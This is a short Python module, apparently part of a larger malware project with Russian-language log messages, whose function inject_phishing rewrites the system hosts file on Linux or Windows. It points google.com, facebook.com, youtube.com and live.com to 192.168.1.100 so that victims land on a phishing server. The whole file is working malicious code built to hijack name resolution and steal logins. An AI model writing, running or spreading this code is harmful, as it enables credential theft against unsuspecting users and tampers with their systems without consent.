import platform, os
from utils.logger import log

PHISHING_DOMAINS = {
    "google.com": "192.168.1.100",
    "facebook.com": "192.168.1.100",
    "youtube.com": "192.168.1.100",
    "live.com": "192.168.1.100"
}

def inject_phishing():
    hosts_path = "/etc/hosts" if platform.system() == "Linux" else r"C:\Windows\System32\drivers\etc\hosts"
    try:
        with open(hosts_path, "r+") as f:
            content = f.read()
            for domain, ip in PHISHING_DOMAINS.items():
                entry = f"{ip} {domain}\n"
                if entry not in content:
                    f.write(entry)
        log("[Phishing] hosts-файл модифицирован")
    except Exception as e:
        log(f"[Phishing] Ошибка: {e}")
